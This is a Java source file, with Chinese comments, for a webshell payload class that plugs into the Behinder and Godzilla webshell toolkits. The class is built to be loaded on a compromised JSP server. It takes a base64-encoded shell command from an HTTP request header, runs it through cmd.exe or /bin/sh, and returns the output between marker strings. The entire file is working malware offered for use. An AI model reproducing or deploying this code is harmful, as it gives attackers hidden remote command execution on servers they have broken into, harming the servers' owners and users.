import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

/**
 * ARTEX 第三方协议（冰蝎 / 哥斯拉）的 JSP 执行端。
 *
 * 冰蝎的 loader 会 newInstance().equals(pageContext)；哥斯拉的 loader 会依次调用
 * equals(outStream)、equals(pageContext)、toString()。两种调用都落到本类的
 * equals(Object)：先接住输出流，再在拿到 pageContext 时执行。
 *
 * 命令与边界放在请求头 X-Artex-Cmd / X-Artex-Mark 里，不解密请求体里的业务参数，
 * 因此同一份 class 可以同时给冰蝎 3/4 和哥斯拉 4 用。
 */
public class ArtexPayload {
    private Object out;
    private boolean ran;

    public ArtexPayload() {
    }

    public boolean equals(Object o) {
        if (o == null) {
            return false;
        }
        if (o instanceof OutputStream) {
            out = o;
            return true;
        }
        if (!ran) {
            ran = true;
            try {
                run(o);
            } catch (Throwable t) {
                writeText("artex error: " + t);
            }
        }
        return true;
    }

    public String toString() {
        return "";
    }

    private void run(Object ctx) throws Exception {
        Object req = invoke(ctx, "getRequest");
        Object resp = invoke(ctx, "getResponse");
        String cmd = header(req, "X-Artex-Cmd");
        String marks = header(req, "X-Artex-Mark");
        if (cmd == null || marks == null) {
            return;
        }
        int i = marks.indexOf('|');
        if (i < 0) {
            return;
        }
        String begin = marks.substring(0, i);
        String end = marks.substring(i + 1);
        String result;
        try {
            result = exec(new String(dec(cmd), "UTF-8"));
        } catch (Throwable t) {
            result = "artex error: " + t;
        }
        OutputStream os = null;
        if (out instanceof OutputStream) {
            os = (OutputStream) out;
        } else if (resp != null) {
            os = (OutputStream) invoke(resp, "getOutputStream");
        }
        if (os != null) {
            os.write((begin + result + end).getBytes("UTF-8"));
            os.flush();
        }
    }

    private void writeText(String text) {
        try {
            OutputStream os = out instanceof OutputStream ? (OutputStream) out : null;
            if (os != null) {
                os.write(text.getBytes("UTF-8"));
                os.flush();
            }
        } catch (Throwable ignored) {
        }
    }

    private static Object invoke(Object o, String name) {
        if (o == null) {
            return null;
        }
        try {
            return o.getClass().getMethod(name, new Class[0]).invoke(o, new Object[0]);
        } catch (Throwable t) {
            return null;
        }
    }

    private static String header(Object req, String name) {
        if (req == null) {
            return null;
        }
        try {
            Object v = req.getClass().getMethod("getHeader", new Class[]{String.class})
                    .invoke(req, new Object[]{name});
            return v == null ? null : v.toString();
        } catch (Throwable t) {
            return null;
        }
    }

    private static String exec(String cmd) throws Exception {
        String os = System.getProperty("os.name");
        boolean win = os != null && os.toLowerCase().indexOf("win") >= 0;
        ProcessBuilder pb = win
                ? new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd})
                : new ProcessBuilder(new String[]{"/bin/sh", "-c", cmd});
        pb.redirectErrorStream(true);
        Process p = pb.start();
        InputStream in = p.getInputStream();
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = in.read(buf)) > 0) {
            bo.write(buf, 0, n);
        }
        p.waitFor();
        return new String(bo.toByteArray(), "UTF-8");
    }

    private static byte[] dec(String s) {
        int end = s.length();
        while (end > 0 && s.charAt(end - 1) == '=') {
            end--;
        }
        ByteArrayOutputStream bo = new ByteArrayOutputStream(end * 3 / 4 + 3);
        int buf = 0;
        int bits = 0;
        for (int i = 0; i < end; i++) {
            char c = s.charAt(i);
            int v;
            if (c >= 'A' && c <= 'Z') {
                v = c - 'A';
            } else if (c >= 'a' && c <= 'z') {
                v = c - 'a' + 26;
            } else if (c >= '0' && c <= '9') {
                v = c - '0' + 52;
            } else if (c == '+') {
                v = 62;
            } else if (c == '/') {
                v = 63;
            } else {
                continue;
            }
            buf = (buf << 6) | v;
            bits += 6;
            if (bits >= 8) {
                bits -= 8;
                bo.write((buf >> bits) & 0xff);
            }
        }
        return bo.toByteArray();
    }
}
